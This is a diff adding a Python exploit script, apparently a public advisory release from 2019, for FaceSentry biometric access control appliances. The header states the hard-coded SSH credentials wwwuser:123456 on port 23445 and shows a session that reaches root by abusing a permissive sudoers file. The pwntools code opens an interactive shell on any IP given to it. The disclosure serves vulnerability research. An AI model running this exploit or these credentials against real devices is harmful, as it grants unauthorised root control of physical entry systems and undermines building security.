@@ -1,0 +1,108 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+#
+#
+# FaceSentry Access Control System 6.4.8 Remote SSH Root Access Exploit
+#
+#
+# Vendor: iWT Ltd.
+# Product web page: http://www.iwt.com.hk
+# Affected version: Firmware 6.4.8 build 264 (Algorithm A16)
+#                   Firmware 5.7.2 build 568 (Algorithm A14)
+#                   Firmware 5.7.0 build 539 (Algorithm A14)
+#
+# Summary: FaceSentry 5AN is a revolutionary smart identity
+# management appliance that offers entry via biometric face
+# identification, contactless smart card, staff ID, or QR-code.
+# The QR-code upgrade allows you to share an eKey with guests
+# while you're away from your Office and monitor all activity
+# via the web administration tool. Powered by standard PoE
+# (Power over Ethernet), FaceSEntry 5AN can be installed in
+# minutes with only 6 screws. FaceSentry 5AN is a true enterprise
+# grade access control or time-and-attendance appliance.
+#
+# Desc: FaceSentry facial biometric access control appliance
+# ships with hard-coded and weak credentials for SSH access
+# on port 23445 using the credentials wwwuser:123456. The root
+# privilege escalation is done by abusing the insecure sudoers
+# entry file.
+#
+# ================================================================
+# lqwrm@metalgear:~$ python ssh_root.py 192.168.11.1
+# [+] Connecting to 192.168.11.1 on port 23445: Done
+# [*] wwwuser@192.168.11.1:
+#     Distro    Ubuntu 16.04
+#     OS:       linux
+#     Arch:     Unknown
+#     Version:  4.10.0
+#     ASLR:     Enabled
+#     Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)
+# [+] Opening new channel: 'shell': Done
+# [*] Switching to interactive mode
+# wwwuser@TWR01:~$ pwd
+# /home/wwwuser
+# wwwuser@TWR01:~$ sudo -l 
+# Matching Defaults entries for wwwuser on localhost:
+# env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+#
+# User wwwuser may run the following commands on localhost:
+#     (root) NOPASSWD: /sbin/service, PROCESSES, NETWORKING, REBOOT, IPTABLES, /faceGuard/bin/*, /faceGuard/database/Restore*, /bin/date, /bin/cat, /bin/echo, /faceGuard/bin/phpbin/*, /bin/sed, /sbin/*, /usr/sbin/*, /bin/*, /usr/bin/*
+# wwwuser@TWR01:~$ sudo cat /etc/sudoers.d/sudoers.sentry
+# Cmnd_Alias SENTRY = /faceGuard/bin/*
+# Cmnd_Alias SENTRY_DB_RESTORE = /faceGuard/database/Restore*
+# Cmnd_Alias DATE = /bin/date
+# Cmnd_Alias CAT = /bin/cat
+# Cmnd_Alias ECHO = /bin/echo
+# Cmnd_Alias PRINTING = /usr/sbin/lpc, /usr/bin/lprm
+# Cmnd_Alias SENTRYWEB = /faceGuard/bin/phpbin/*
+# Cmnd_Alias SED = /bin/sed
+# Cmnd_Alias SERVICES = /sbin/service
+# Cmnd_Alias SBIN = /sbin/*, /usr/sbin/*
+# Cmnd_Alias BIN = /bin/*, /usr/bin/*
+#
+# wwwuser ALL=NOPASSWD: SERVICES, PROCESSES, NETWORKING, REBOOT, IPTABLES, SENTRY, SENTRY_DB_RESTORE, DATE, CAT, ECHO, SENTRYWEB, SED, SBIN, BIN
+# iwtuser ALL=NOPASSWD: SERVICES, PROCESSES, NETWORKING, REBOOT, IPTABLES, SENTRY, SENTRY_DB_RESTORE, DATE, CAT, ECHO, SENTRYWEB, SED, SBIN, BIN
+# wwwuser@TWR01:~$ id
+# uid=1001(wwwuser) gid=1001(wwwuser) groups=1001(wwwuser),27(sudo)
+# wwwuser@TWR01:~$ sudo su
+# root@TWR01:/home/wwwuser# id
+# uid=0(root) gid=0(root) groups=0(root)
+# root@TWR01:/home/wwwuser# exit
+# exit
+# wwwuser@TWR01:~$ exit
+# logout
+# [*] Got EOF while reading in interactive
+# [*] Closed SSH channel with 192.168.11.1
+# lqwrm@metalgear:~$
+# ================================================================
+#
+# Tested on: Linux 4.14.18-sunxi (armv7l) Ubuntu 16.04.4 LTS (Xenial Xerus)
+#            Linux 3.4.113-sun8i (armv7l)
+#            PHP/7.0.30-0ubuntu0.16.04.1
+#            PHP/7.0.22-0ubuntu0.16.04.1
+#            lighttpd/1.4.35
+#            Armbian 5.38
+#            Sunxi Linux (sun8i generation)
+#            Orange Pi PC +
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2019-5526
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5526.php
+#
+#
+# 28.05.2019
+#
+
+from pwn import *
+
+if len(sys.argv) < 2:
+    print 'Usage: ./fs.py <ip>\n'
+    sys.exit()
+
+ip = sys.argv[1]
+rshell = ssh('wwwuser', ip, password='123456', port=23445)
+rshell.interactive()
